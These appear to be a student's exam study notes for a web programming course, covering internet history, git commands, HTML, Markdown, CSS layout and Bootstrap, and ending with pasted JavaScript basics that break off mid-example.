Exam notes

General Notes

History of the Internet

Three phases:
Formation of the internet that supports the communication of web applications
Creation of HTML and HTTP, allowing shared hyperlinked documents (Web 1.0)
Creation of CSS and JavaScript that enabled interactive web apps (Web 2.0)

The Internet
DoD created ARPANET to share info between universities doing defense related research
Designed to withstand nuclear attack--redundantly connected graph of computers, without a single central authority. 
Two major organizations manage the internet: 
the Internet Engineering Task Force (IETF) defines technical standards that specify how the physical network communicates
The Internet Corporation for Assigned Names and Numbers (ICANN) oversees IP addresses and the Domain Name System (DNS). 
The US government transitioned control of these governing bodies to a global community of non-profit stake holders in 2016, so the internet is a worldwide asset free from any specific political control. 

HTML
HTML was based on inspiration from the digital publishing industry’s Standard Generalized Markup Language. 
HyperText Transfer Protocol (HTTP) and the Uniform Resource Locator (URL) specify how web documents are addressed and transmitted. 

CSS
Cascading Style Sheets (CSS) was first proposed in 1994, to give HTML documents visual styling independent of the content’s structure. 

JavaScript
1995, Netscape (company that made the browser Navigator) added the ability to script webpages. 

Technology Stack

A technology stack is the collection of technologies you use to create or deliver your web application. 
Web framework is generally the top of the stack
Ex. Angular, React, Vue, Svelte
Web services
Ex. providing authentication, business, data, and persistent storage
Backend services
Ex. caching, database, logging, and monitoring

Our stack: 
Web framework: React
Caddy as web server, hosted on AWS
Web services: Node.js
MongoDB as database hosted on MongoDB Atlas

Caddy

Caddy is a web service that listens for incoming HTTP requests, then serves the requested static files, or routes the request to another web service. 
The ability to route requests is called a gateway, or reverse proxy. 

Things Caddy does:
Handles creation and rotation of web certificates, allowing you to support HTTPS
Serves up static HTML, CSS, and JavaScript files
Acts as a gateway for subdomain requests


HTTPS

During the first couple decades of the web, it was common to just use HTTP. Only websites that were doing commerce really needed a secure connection. 
HTTPS stands for Secure Hypertext Transport Protocol. 
Having a secure connection means that all the data being exchanged is encrypted using the TLS protocol. 
Modern browsers now expect web servers to exclusively use HTTPS for all communication. 


Git Commands:
git init
Initializes your current directory as a Git repository
ls -la
Lists all files, including hidden ones, in current directory
git status
Tells you about any untracked files 
git add .
Tells Git to stage all untracked files, so they are ready to be committed
git commit -m “commit message”
Commits to the repository
git commit -am “commit message”
Tells Git to add AND commit all modified, tracked files, in one step. 
git log
View a log of all commits, along with their SHA identifiers
git checkout d83hfi9e2
Temporarily switch back to a previous version to see what it contains, using the SHA identifier. 
Use git checkout master to get back to the latest version
git diff HEAD HEAD~1
View the difference between the commit you’re currently looking at, and the commit 1 before it. You can also specify two SHAs you want to compare. 
git branch A
Create a branch named A. (It starts out as a copy of the master branch
Start working on the new branch with “git checkout A”. Now you can commit to either the master branch or branch A. 
When you want to combine the branches, checkout the master branch and do “git merge A”. If you want, though, you can also just abandon the branch. 




HTML

HyperText Markup Language (HTML) is the foundational content structure that all web applications build on. 
HTML was originally designed to be a publishing format for web documents, or pages. 
Nowadays, a page can be a single page application (SPA) or a large group of hyperlinked pages that form a multi-page application (MPA). 

Elements and tags
HTML elements are enclosed within tags. 
Tags are delimited with <> and closing tags have a forward slash before its name. 

Good tags: 
<html>  -  top level page structure
<head>  -  contains metadata about the page and page title
<body>  -  represents content structure
<main>  -  represents main content structure, as opposed to things like headers, footers, asides, and navigation content. 

Attributes:
Attributes describe the specific details of an element. Single or double quotes are fine.
id  -  gives a unique ID to the element so you can distinguish it from others. 
class  -  designates the element as part of a named group of elements
Example: <p id="hello" class="greeting">Hello world</p>


Hyperlinks: 
Represented with an anchor element (a) that has an attribute containing the address of the hyperlink. 
Example: <a href="https://byu.edu">Go to the Y</a>

Full example: 
<!DOCTYPE html>
<html lang="en">
  <body>
    <main>
      <h1>Hello world</h1>
      <p class="introduction">
        HTML welcomes you to the amazing world of
        <span class="topic">web programming</span>.
      </p>
      <p class="question">What will this mean to you?</p>
      <p class="assignment">Learn more <a href="instruction.html">here</a>.</p>
    </main>
  </body>
</html>


Common elements: 

html	The page container
head	Header information
title	Title of the page
meta	Metadata for the page such as character set or viewport settings
script	JavaScript reference. Either a external reference, or inline
include	External content reference
body	The entire content body of the page
header	Header of the main content
footer	Footer of the main content
nav	Navigational inputs
main	Main content of the page
section	A section of the main content
aside	Aside content from the main content
div	A block division of content
span	An inline span of content
h<1-9>	Text heading. From h1, the highest level, down to h9, the lowest level
p	A paragraph of text
b	Bring attention
table	Table
tr	Table row
th	Table header
td	Table data
ol,ul	Ordered or unordered list
li	List item
a	Anchor the text to a hyperlink
img	Graphical image reference
dialog	Interactive component such as a confirmation
form	A collection of user input
input	User input field
audio	Audio content
video	Video content
svg	Scalable vector graphic content
iframe	Inline frame of another HTML page

Comments: 
<!-- this is a comment -->

Special Characters

If you want to use one of HTML’s reserved characters in your website’s content, you need to escape them using the entity syntax. 

&	&amp;
<	&lt;
>	&gt;
"	&quot;
'	&apos;
😀	&#128512;

index.html

When you go to a website without specifying a specific HTML file that you want, the server will display the HTML file named index.html. So it’s common to name the main HTML file for your website index.html

Block vs Inline

Block elements are meant to be distinct blocks in the flow of the content structure
Inline elements are meant to be inline with the content flow of a block element. They do not disrupt the flow of a block element’s content. 

Input Elements

Element
Meaning
Example
form
Input container and submission
<form action="form.html" method="post">
fieldset
Labeled input grouping
<fieldset> ... </fieldset>
input
Multiple types of user input
<input type="" />
select
Selection dropdown
<select><option>1</option></select>
optgroup
Grouped selection dropdown
<optgroup><option>1</option></optgroup>
option
Selection option
<option selected>option2</option>
textarea
Multiline text input
<textarea></textarea>
label
Individual input label
<label for="range">Range: </label>
output
Output of input
<output for="range">0</output>
meter
Display value with a known range
<meter min="0" max="100" value="50"></meter>


You can set the type of input with the type attribute. 

Type
Meaning
text
Single line textual value
password
Obscured password
email
Email address
tel
Telephone number
url
URL address
number
Numerical value
checkbox
Inclusive selection
radio
Exclusive selection
range
Range limited number
date
Year, month, day
datetime-local
Date and time
month
Year, month
week
Week of year
color
Color
file
Local file
submit
button to trigger form submission


Example: this is a checked radio button, with a label.

<label for="checkbox1">Check me</label> <input type="checkbox" name="varCheckbox" value="checkbox1" checked />

Most input elements share these attributes:

Attribute
Meaning
name
The name of the input. This is submitted as the name of the input if used in a form
disabled
Disables the ability for the user to interact with the input
value
The initial value of the input
required
Signifies that a value is required in order to be valid


For these inputs: text, search, url, tel, email, and password, there is a pattern attribute. When you use this, it provides a regular expression that must match for the input to be considered valid. 

Media Elements

Elements that represent media: img, audio, video, svg, and canvas
img, audio, and video are references to an external file. svg and canvas contain the code to render a visual image, which can be animated. 

The tags that reference external media all take a URL as an attribute. This can be a full path (complete URL) or a relative path (referencing a file that is served from the same location as the HTML page rendering the element).
You want to make the path as relative as possible so that you can move your code around without having to adjust all of the external media references. 

Audio/Video
Include the controls attribute if you want the user to be able to control audio playback. If you don’t, then there is no visual representation of the audio in the rendered page. 
The autoplay attribute starts the audio playing as soon as the audio file is loaded. The loop attribute keeps it playing over and over. 
You may need to include the attribute crossorigin=”anonymous” if you are requesting files from a different domain

Scalable Vector Graphics (SVG)
A powerful and widely supported way to render graphics inline in your HTML
Canvas
Used for 2D drawing and animation. Actually drawing on the canvas requires JavaScript support. 

More Examples
Insert images: 
<img src="img_girl.jpg" alt="Girl in a jacket" width="500" height="600">

Markdown syntax

Headings: 
# A first-level heading
## A second-level heading
### A third-level heading

Styling:
**this is bold** __so is this__
*this is italicized* _so is this_
~~strikethrough~~
**this is bold _with_ nested italics**
***this is bold and italics***
<sub>this is a subscript</sub>
<sup>this is a superscript</sup>

Quotes:
> This is a quote
```print(“this is code”)```
If you put a color color value in like this `#ffffff` or `rgb(9, 105, 218)` you will be able to see it 

Links:
This is a link to [Google](https://www.google.com/)

Images: 
To display an image: 
![This is a picture of a dog](linkhere.c o m)

Lists:
You can make a list by preceding one of more lines of text with - * or +
+ hi
+ there

Or an ordered list like this:
1. first hi
1. second hi


Other things I don’t care about taking notes on: 
Nested list
Checkbox lists
Mentioning people
Emojis
Footnotes
Comments
Ignoring markdown formatting


CSS

Comments: /* comment goes here */
CSS is primarily concerned with defining rulesets or rules. 
A rule consists of a selector that specifies which elements to apply the rule to, and one or more declarations that say which property to style with the given property value. 

Example:
p {
  font-family: sans-serif;
  font-size: 2em;
  color: navy;
  text-shadow: 3px 3px 1px #cccccc;
}
The selector p selects all paragraph elements in the HTML document. The four declarations change the font to sans-serif, increase the font size to be twice as big as the default, change text color to navy, and create a gray shadow for the text. 

Three ways to associate CSS with HTML:
Use the style attribute of an HTML element, and explicitly assign one or more declarations
<p style="color:green">your text here</p>
Use the HTML style element to define CSS rules within the HTML document. If you do this, the style element should be in the head element of the document, so the rules apply to all elements of the document. 
<head>
  <style>
    p {
      color: green;
    }
  </style>
</head>
<body>
  <p>your text here</p>
</body>

Use the HTML link element to create a hyperlink reference to an external file containing CSS rules. The link has to be in the head element of the document. 
<link rel="stylesheet" href="styles.css" />
File styles.css contains p { color: green; }
Using the link element is usually the preferred way

Elements inherit the rules applied to their parents, so you have to override them specifically. 
CSS defines everything as boxes. Within an element’s box, there are nested boxes. Going from innermost to outermost, the layers are: 
Content, like text or an image
Padding (background color)
Border (color, thickness, and line style)
Margin (whitespace)
By default the width and height of an element is defined by the width and height of the content box. You can change the box-sizing CSS property if you want--the default value is content-box. If you change it to border-box, the width and height of the element will also include the padding and border. This makes it easier to style elements when their visual size matches their actual size. 


Selectors

If you want something to apply to everything in the document, put it in the body section. 
body {
  font-family: sans-serif;
}

Give a bottom border to all h1 headings
h1 {
  border-bottom: thin black solid;
}

Make each section have a gray background and some white space in the padding and margins
section {
  background: #eeeeee;
  padding: 0.25em;
  margin-bottom: 0.5em;
}

Change the color of h2 headings, but only if they’re within a section. This is called a descendant combinator. Space delimited list of values, where each item is a descendent of the previous item. 
section h2 {
  color: #004400;
}

Other types of combinators, which let you control which elements a rule applies to:

Combinator
Meaning
Example
Description
Descendant
A list of descendants
body section
Any section that is a descendant of a body
Child
A list of direct children
section > p
Any p that is a direct child of a section
General sibling
A list of siblings
p ~ div
Any p that has a div sibling
Adjacent sibling
A list of adjacent sibling
p + div
Any p that has an adjacent div sibling


Increase the whitespace padding on the left of paragraphs that are siblings of a level two heading
h2 ~ p {
  padding-left: 0.5em;
}

Class selector: say you have a summary paragraph in each section, denoted like this: 
<p class="summary">Summary goes here</p> 
You could make it so that all elements with a summary class are bolded, like this. 

.summary {
  font-weight: bold;
}

Or you could make it so it only applies to paragraph elements with a summary class:
p.summary {
  font-weight: bold;
}

ID selector: say you had a section that you wanted to highlight. You could give that section an ID like this: 
<section id="physics">Your Section Here</section>
All IDs should be unique within an HTML document, so you can use them to target a specific element. Do this to give the physics section a purple left border:

#physics {
  border-left: solid 1em purple;
}

Attribute selector: lets you select any element that has a given attribute. So, any element that has an href, or a class, or an ID or something. 
You can also specify a required value for the attribute like this: a[href="./fish.png"] or you can use wildcards to select attribute values containing specific text: a[href*="https://"]

p[class='summary'] {
  color: red;
}

Pseudo selector: select based on positional relationships, mouse interactions, hyperlink visitation states, and attributes. For example, if you want the purple highlight bar to appear when the mouse hovers over the text, change the ID selector you had before to select only when a section is hovered over. 
section:hover {
  border-left: solid 1em purple;
}

Declarations

Declarations specify a property and a value to assign when the rule selector matches an element. Here are some of the common properties and values you can assign. 




Property
Value
Example
Discussion
background-color
color
red
Fill the background color
border
color width style
#fad solid medium
Sets the border using shorthand where any or all of the values may be provided
border-radius
unit
50%
The size of the border radius
box-shadow
x-offset y-offset blu-radius color
2px 2px 2px gray
Creates a shadow
columns
number
3
Number of textual columns
column-rule
color width style
solid thin black
Sets the border used between columns using border shorthand
color
color
rgb(128, 0, 0)
Sets the text color
cursor
type
grab
Sets the cursor to display when hovering over the element
display
type
none
Defines how to display the element and its children
filter
filter-function
grayscale(30%)
Applies a visual filter
float
direction
right
Places the element to the left or right in the flow
flex




Flex layout. Used for responsive design
font
family size style
Arial 1.2em bold
Defines the text font using shorthand
grid




Grid layout. Used for responsive design
height
unit
.25em
Sets the height of the box
margin
unit
5px 5px 0 0
Sets the margin spacing
max-[width/height]
unit
20%
Restricts the width or height to no more than the unit
min-[width/height]
unit
10vh
Restricts the width or height to no less than the unit
opacity
number
.9
Sets how opaque the element is
overflow
[visible/hidden/scroll/auto]
scroll
Defines what happens when the content does not fix in its box
position
[static/relative/absolute/sticky]
absolute
Defines how the element is positioned in the document
padding
unit
1em 2em
Sets the padding spacing
left
unit
10rem
The horizontal value of a positioned element
text-align
[start/end/center/justify]
end
Defines how the text is aligned in the element
top
unit
50px
The vertical value of a positioned element
transform
transform-function
rotate(0.5turn)
Applies a transformation to the element
width
unit
25vmin
Sets the width of the box
z-index
number
100
Controls the positioning of the element on the z axis



There are a variety of units you can use when defining the size of a CSS property. Pixels (px) or inches (in), relative units such as a percentage of the parent element, percentage of a minimum viewport dimension (25vmin), or a multiplier of the size of the letter m (1.5rem) as defined by the root element.
p {
  width: 25%;
  height: 30vh;
}
Most commonly used units: 


Unit
Description
px
The number of pixels
pt
The number of points (1/72 of an inch)
in
The number of inches
cm
The number of centimeters
%
A percentage of the parent element
em
A multiplier of the width of the letter m in the parent's font
rem
A multiplier of the width of the letter m in the root's font
ex
A multiplier of the height of the element's font
vw
A percentage of the viewport's width
vh
A percentage of the viewport's height
vmin
A percentage of the viewport's smaller dimension
vmax
A percentage of the viewport's larger dimension


When you use it as a property value, it’ll have the number before, with no space, like 5px.



Multiple ways to describe colors: 


Method
Example
Description
keyword
red
A set of predefined colors (e.g. white, cornflowerblue, darkslateblue)
RGB hex
#00FFAA22 or #0FA2
Red, green, and blue as a hexadecimal number, with an optional alpha opacity
RGB function
rgb(128, 255, 128, 0.5)
Red, green, and blue as a percentage or number between 0 and 255, with an optional alpha opacity percentage
HSL
hsl(180, 30%, 90%, 0.5)
Hue, saturation, and light, with an optional opacity percentage. Hue is the position on the 365 degree color wheel (red is 0 and 255). Saturation is how gray the color is, and light is how bright the color is.


Fonts

The font-family property defines which fonts should be used. A font family is an ordered list of fonts. The first font in the list that is available will be used. This is important because different operating systems have different default fonts, and your first choice might not be available. 
Four major families: serif, sans-serif, fixed, and symbol. 
Fixed font means all characters are the same size. Symbol fonts include things like arrows or emojis. 
You can specify a font that you provide with your application, if you want. That way, your application is guaranteed to always look the same. To have the browser load a font, use the @font-face rule and provide the font name and source location. 

@font-face {
  font-family: 'Quicksand';
  src: url('https://cs260.click/fonts/quicksand.ttf');
}

p {
  font-family: Quicksand;
}

If you do not want to host font files on your server, then you can load them from a font provider. Google has open source fonts that you can use for free. 

@import url('https://fonts.googleapis.com/css2?family=Rubik Microbe&display=swap');

p {
  font-family: 'Rubik Microbe';
}


CSS Animation 

Say you have a paragraph of centered text, and you want to zoom until its size is 20% of the view height. 
p {
  text-align: center;
  font-size: 20vh;

  animation-name: demo;
  animation-duration: 3s;
}

Then we create the keyframes. CSS will automatically generate a smooth transition between them. We create two frames, from and to, that designate start and finish. We also designate a keyframe that happens 95% of the way through the animation. (This one makes the text bounce out a little bigger than its final size.)

@keyframes demo {
  from {
    font-size: 0vh;
  }

  95% {
    font-size: 21vh;
  }

  to {
    font-size: 20vh;
  }
}

Misc. Stuff You Can Do
font-style: italic
table, th, td { border: black solid thin } (applies to the whole table and also individual head and body cells)
Justify-content: center (vertical alignment)

Responsive Design
Responsive design is when you reconfigure the interface to accommodate and take advantage of the screen size and orientation

The display property lets you change how an HTML element is displayed by the browser. 


Value
Meaning
none
Don't display this element. The element still exists, but the browser will not render it.
block
Display this element with a width that fills its parent element. A p or div element has block display by default.
inline
Display this element with a width that is only as big as its content. A b or span element has inline display by default.
flex
Display this element's children in a flexible orientation.
grid
Display this element's children in a grid orientation.



Example: div elements have “block” as their default display property. This HTML would render as this: 


<div class="none">None</div>
<div class="block">Block</div>
<div class="inline">Inline1</div>
<div class="inline">Inline2</div>
<div class="flex">
  <div>FlexA</div>
  <div>FlexB</div>
  <div>FlexC</div>
  <div>FlexD</div>
</div>
<div class="grid">
  <div>GridA</div>
  <div>GridB</div>
  <div>GridC</div>
  <div>GridD</div>
</div>

But if you modify the CSS like this, you get this. 
.none {
  display: none;
}

.block {
  display: block;
}

.inline {
  display: inline;
}

.flex {
  display: flex;
  flex-direction: row;
}

.grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
}



Viewport meta tag: 
Mobile browsers automatically scale websites to look better on a small screen. But now that websites can be responsive to screen size, the mobile browser’s auto-scaling gets in the way. The solution is to include this meta tag in the head element of all your HTML pages, to tell the browser not to scale the page. 
<meta name="viewport" content="width=device-width,initial-scale=1" />

The float property moves an element to the left or right of its container element, and allows inline elements to wrap around it. 
Example: if you had an aside element, and wanted it to stay to the right while text wraps around it when the browser gets resized, do this: 
aside {
  float: right;
  padding: 3em;
  margin: 0.5em;
  border: black solid thin;
}

Use the @media selector to dynamically detect the size and orientation of the device, and apply CSS rules to accommodate the change. 

This code says, if the orientation is portrait, rotate all div elements by 270 degrees. 
@media (orientation: portrait) {
  div {
    transform: rotate(270deg);
  }
}
Instead of transform: rotate, you could also do display: none; to make it so that something disappears if it’s in portrait. 


Grid
Grid display layout is useful when you want to display a group of child elements in a responsive grid. Start with a container element that has a bunch of child elements: 

<div class="container">
  <div class="card"></div>
  <div class="card"></div>
  <div class="card"></div>
</div>

Turn it into a responsive grid by including this in CSS: 

.container {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  grid-auto-rows: 300px;
  grid-gap: 1em;
}
This makes it so that all children of the container element are to be displayed in a grid. Each column will auto-fill the parent’s width with children that are minimum 300 pixels, and max 1 equal fractional unit of the parent’s total width. The height of rows is set to exactly 300 pixels. And the gap between rows and columns is 1em. 

Flexbox
This is used when you want to partition your application into areas that responsively move around as the window resizes or orientation changes. 

Make the body of your website into a responsive flexbox, so that all children of the body are part of the flexbox: 
body {
  display: flex;
  flex-direction: column;
  margin: 0;
  height: 100vh;
}
This makes it so that top level flexbox children are column oriented (on top of each other), and fill the entire height of the viewport with the application. 

header {
  flex: 0 80px;
  background: hsl(223, 57%, 38%);
}

footer {
  flex: 0 30px;
  background: hsl(180, 10%, 10%);
}

main {
  flex: 1;
  display: flex;
  flex-direction: row;
}

The 0 means it won’t grow, and 80px means that’s its starting height. So it’s a fixed size box. 
Flex:1 means it will get one fractional unit of growth, and since it’s the only child that can grow, it will get all the remaining space. Main is also a flexbox of its own, and the flex direction is row, so that the children are oriented side by side. 

In main, you want to have controls on the right, and the content taking up the rest of the space. Say you want controls to take up 25% of the screen. Flex: 1 means it gets 1 fractional unit. Since content gets 3, it’s 75%/25%.

section:nth-child(1) {
  flex: 1;
  background-color: hsl(180, 10%, 80%);
}
section:nth-child(2) {
  flex: 3;
  background-color: white;
}

Add some media queries that drop the header and footer if the viewport is too short, and orient the main sections as rows if it gets too narrow. 

@media (orientation: portrait) {
  main {
    flex-direction: column;
  }
}

@media (max-height: 700px) {
  header {
    display: none;
  }
  footer {
    display: none;
  }
}

Debugging

Right click on something and click inspect to open the debugger window. Look at elements tab, and Styles. 

CSS Frameworks

CSS frameworks provide functions and components that commonly appear in websites. Bootstrap is the most popular CSS framework. 

How to use it: reference the Bootstrap CSS files from their content delivery network (CDN). Add the HTML links to your head element. 

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"
      crossorigin="anonymous"
    />
  </head>
  <body>
    ...
  </body>
</html>

If you want to use Bootstrap components that use JavaScript, you need to include the JS module, at the end of your HTML body element, like this.

<body>
  ...

  <script
    src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
    crossorigin="anonymous"
  ></script>
</body>

Use the Node Package Manager (NPM) to download Bootstrap and include it in your source code. Run this from your console to do that, so that you have it on YOUR server and you’re not relying on someone else’s server for a vital piece of your application. 
npm install bootstrap@5.2.3

// Bootstrap styled button
<button type="button" class="btn btn-primary">Bootstrap</button>

// Default browser styled button
<button type="button">Plain</button>



















Officially known as ECMAScript, JavaScript is a weakly typed language based upon concepts found in C, Java, and Scheme. It is by far the most used programming language in the world. It runs on every web browser, and it is commonly used as a web server language and for creating serverless functions. In this instruction we will cover the basic parts of the language necessary to create a reasonable website. There are many features of the language that will not be discussed, and you should take time to dig into the corners of the language as time allows. The more effectively you understand JavaScript, the better web programmer you will be.

Typically JavaScript is executed using an interpreter at runtime instead of compiling it into a machine specific binary at build time. This has the advantage of making JavaScript very portable, but also allows for many errors, such as using an undefined variable. These types of errors commonly only get discovered when the program crashes during execution.

JavaScript Versions
The following table describes the version history of JavaScript. You don't need to worry too much about versions right now, but this is important to be aware of since browser compatibility is always an issue when developing a web application. When considering the use of a JavaScript feature you should consult websites like MDN or CanIUse to see how well the feature is supported.

Year	Version	Features
1997	ES1	types, functions
1999	ES3	regex, exceptions, switch
2009	ES5	json, array iteration
2015	ES6	let/const, default params, classes, template literals, destructuring, generators, promises, modules, internationalization
2016	ES2016	array.includes
2017	ES2017	async/await
2018	ES2018	rest/spread, promise.finally
2019	ES2019	string.trim
2020	ES2020	?? operator
Getting started
Let's start with a basic example. The following JavaScript will concatenate three strings together and then throw away the result. Not very useful, but JavaScript doesn't complain much.

'Hello' + ' ' + 'world';
Only slightly more complex is to call a function with the result of our concatenated string. In this case we call the JavaScript runtime's built in function console.log to output the string to the debugger console.

console.log('Hello' + ' ' + 'world');
// OUTPUT: Hello world
You can also write your own functions.

function join(a, b) {
  return a + ' ' + b;
}

console.log(join('Hello', 'world'));
// OUTPUT: Hello world
Comments
You can comment your JavaScript with either line or block comments.

// Line comment

/*
Block comment
*/
Code delimiters
While not technically required in most cases, it is considered good form to end JavaScript statements with a semicolon (;). Code blocks, and their resulting scope, are defined with curly braces ({ }).

Playgrounds
Before we go any further we need a way for you to write and run JavaScript yourself. There are two easy ways to do this.

Use an online sandbox like CodePen. With CodePen you can write whatever JavaScript you would like and immediately see the results. Make sure you display the CodePen's Console window if your JavaScript is using the console.log function.

Browser Debugger

Use your browser's debugger. For example, if you open Chrome and press F12 the debugger will display. Select the Console menu option. This will display a JavaScript interpreter where you can write and execute your code.

Browser Debugger

Examples
You can see examples of all the JavaScript we will talk about by using this HTML page.

The JavaScript console object provides interaction with the JavaScript runtime's debugger console. This usage of console should not be confused with your operating system's console (AKA terminal or command line). The console object provides functionality for outputting the value of text and objects, running timers, and counting iterations. These are useful debugging tools when you can actually execute your code in an interactive debugger (such as VS Code).

Log
The basic usage of the console object is to output a log message.

console.log('hello');
// OUTPUT: hello
You can create formatted messages in the log parameter.

console.log('hello %s', 'world');
// OUTPUT: hello world
You can even specify CSS declarations in order to style the log output.

console.log('%c JavaScript Demo', 'font-size:1.5em; color:green;');
// OUTPUT: JavaScript Demo //in large green text
Timers
If you are trying to see how long a piece of code is running you can wrap it with time and timeEnd calls and it will output the duration between the time and timeEnd calls.

console.time('demo time');
// ... some code that takes a long time.
console.timeEnd('demo time');
// OUTPUT: demo time: 9762.74 ms
Count
To see how many times a block of code is called you can use the count function.

console.count('a');
// OUTPUT: a: 1
console.count('a');
// OUTPUT: a: 2
console.count('b');
// OUTPUT: b: 1

Adding JavaScript to HTML
You can insert JavaScript into HTML either by directly including it in the HTML within the content of a <script> element, or by using the src attribute of the script element to reference an external JavaScript file.

index.js

function sayHello() {
  console.log('hello');
}
index.html

<head>
  <script src="javascript.js"></script>
</head>
<body>
  <button onclick="sayHello()">Say Hello</button>
  <button onclick="sayGoodbye()">Say Goodbye</button>
  <script>
    function sayGoodbye() {
      alert('Goodbye');
    }
  </script>
</body>
Notice that we call the sayHello and sayGoodbye JavaScript functions from the HTML in the onclick attribute of the button element. Special attributes like onclick automatically create event listeners for different DOM events that call the code contained in the attribute's value. The code specified by the attribute value can be a simple call to a function or any JavaScript code.

<button onclick="let i=1;i++;console.log(i)">press me</button>
<!-- OUTPUT: 2 -->

JavaScript type and construct
📖 Deeper dive reading: MDN Data types and structures

Declaring variables
Variables are declared using either the let or const keyword. let allows you to change the value of the variable while const will cause an error if you attempt to change it.

let x = 1;

const y = 2;
⚠ Originally JavaScript used the keyword var to define variables. This has been deprecated because they cause hard-to-detect errors in code related to the scope of the variable. You should avoid var and always declare your variables either with let or const.

Type
JavaScript defines several primitive types.

Type	Meaning
Null	The type of a variable that has not been assigned a value.
Undefined	The type of a variable that has not been defined.
Boolean	true or false.
Number	A 64-bit signed number.
BigInt	A number of arbitrary magnitude.
String	A textual sequence of characters.
Symbol	A unique value.
Of these types Boolean, Number, and String are the types commonly thought of when creating variables. However, variables may commonly refer to the Null or Undefined primitive. Because JavaScript does not enforce the declaration of a variable before you use it, it is entirely possible for a variable to have the type of Undefined.

In addition to the above primitives, JavaScript defines several object types. Some of the more commonly used objects include the following:

Type	Use	Example
Object	A collection of properties represented by name-value pairs. Values can be of any type.	{a:3, b:'fish'}
Function	An object that has the ability to be called.	function a() {}
Date	Calendar dates and times.	new Date('1995-12-17')
Array	An ordered sequence of any type.	[3, 'fish']
Map	A collection of key-value pairs that support efficient lookups.	new Map()
JSON	A lightweight data-interchange format used to share information across programs.	{"a":3, "b":"fish"}
Common operators
When dealing with a number variable, JavaScript supports standard mathematical operators like + (add), - (subtract), * (multiply), / (divide), and === (equality). For string variables, JavaScript supports + (concatenation) and === (equality).

Type conversions
JavaScript is a weakly typed language. That means that a variable always has a type, but the variable can change type when it is assigned a new value, or that types can be automatically converted based upon the context that they are used in. Sometimes the results of automatic conversions can be unexpected from programmers who are used to strongly typed languages. Consider the following examples.

2 + '3';
// OUTPUT: '23'
2 * '3';
// OUTPUT: 6
[2] + [3];
// OUTPUT: '23'
true + null;
// OUTPUT: 1
true + undefined;
// OUTPUT: NaN
Getting unexpected results is especially common when dealing with the equality operator.

1 == '1';
// OUTPUT: true
null == undefined;
// OUTPUT: true
'' == false;
// OUTPUT: true
⚠ The unexpected results happen in JavaScript because it uses complex rules for defining equality that depend upon the conversion of a type to a boolean value. You will sometimes hear this referred to as falsy and truthy evaluations. To remove this confusion, JavaScript introduced the strict equality (===) and inequality (!==) operators. The strict operators skip the type conversion when computing equality. This results in the following.

1 === '1';
// OUTPUT: false
null === undefined;
// OUTPUT: false
'' === false;
// OUTPUT: false
Because strict equality is considered more intuitive, it is almost always preferred and should be used in your code.

Here is a fun example of JavaScript's type conversion. Execute the following in the browser's debugger console.

('b' + 'a' + +'a' + 'a').toLowerCase();
Conditionals
JavaScript supports many common programming language conditional constructs. This includes if, else, and if else. Here are some examples.

if (a === 1) {
  //...
} else if (b === 2) {
  //...
} else {
  //...
}
You can also use the ternary operator. This provides a compact if else representation.

a === 1 ? console.log(1) : console.log('not 1');
You can use boolean operations in the expression to create complex predicates. Common boolean operators include && (and), || (or), and ! (not).

if (true && (!false || true)) {
  //...
}
Loops
JavaScript supports many common programming language looping constructs. This includes for, for in, for of, while, do while, and switch. Here are some examples.

for
Note the introduction of the common post increment operation (i++) for adding one to a number.

for (let i = 0; i < 2; i++) {
  console.log(i);
}
// OUTPUT: 0 1
do while
let i = 0;
do {
  console.log(i);
  i++;
} while (i < 2);
// OUTPUT: 0 1
while
let i = 0;
while (i < 2) {
  console.log(i);
  i++;
}
// OUTPUT: 0 1
for in
The for in statement iterates over an object's property names.

const obj = { a: 1, b: 'fish' };
for (const name in obj) {
  console.log(name);
}
// OUTPUT: a
// OUTPUT: b
For arrays the object's name is the array index.

const arr = ['a', 'b'];
for (const name in arr) {
  console.log(name);
}
// OUTPUT: 0
// OUTPUT: 1
for of
The for of statement iterates over an iterable's (Array, Map, Set, ...) property values.

const arr = ['a', 'b'];
for (const val of arr) {
  console.log(val);
}
// OUTPUT: 'a'
// OUTPUT: 'b'
Break and continue
All of the looping constructs demonstrated above allow for either a break or continue statement to abort or advance the loop.

let i = 0;
while (true) {
  console.log(i);
  if (i === 0) {
    i++;
    continue;
  } else {
    break;
  }
}
// OUTPUT: 0 1

JavaScript string
📖 Deeper dive reading: MDN String

Strings are a primitive type in JavaScript. A string variable is specified by surrounding a sequence of characters with single quotes ('), double quotes ("), or backticks (`). The meaning of single or double quotes are equivalent, but the backtick defines a string literal that may contain JavaScript that is evaluated in place and concatenated into the string. A string literal replacement specifier is declared with a dollar sign followed by a curly brace pair. Anything inside the curly braces is evaluated as JavaScript. You can also use backticks to create multiline strings without having to explicitly escape the newline characters using \n.

'quoted text'; // " also works

const l = 'literal';
console.log(`string ${l + (1 + 1)} text`);
// OUTPUT: string literal2 text
Unicode support
JavaScript supports Unicode by defining a string as a 16-bit unsigned integer that represents UTF-16 strings. Unicode support allows JavaScript to represent most languages spoken on the planet. This includes those that are read from right to left.

حجر

أقول لهذا الحجر: أنا أنت. فيقول: لستَ مرناً الى هذا الحدّ. أقول: قلبي مثلك؟ فيقول:

However, there are several important steps you must take in order to make your web application fully internationalized. This includes handling of currency, time, dates, iconography, units of measure, keyboard layouts, and respecting local customs. Read this article on the W3C website to learn more about internationalization.

String functions
The string object has several interesting functions associated with it. Here are some of the commonly used ones.

Function	Meaning
length	The number of characters in the string
indexOf()	The starting index of a given substring
split()	Split the string into an array on the given delimiter string
startsWith()	True if the string has a given prefix
endsWith()	True if the string has a given suffix
toLowerCase()	Converts all characters to lowercase
const s = 'Example:조선글';

console.log(s.length);
// OUTPUT: 11
console.log(s.indexOf('조선글'));
// OUTPUT: 8
console.log(s.split(':'));
// OUTPUT: ['Example', '조선글']
console.log(s.startsWith('Ex'));
// OUTPUT: true
console.log(s.endsWith('조선글'));
// OUTPUT: true
console.log(s.toLowerCase());
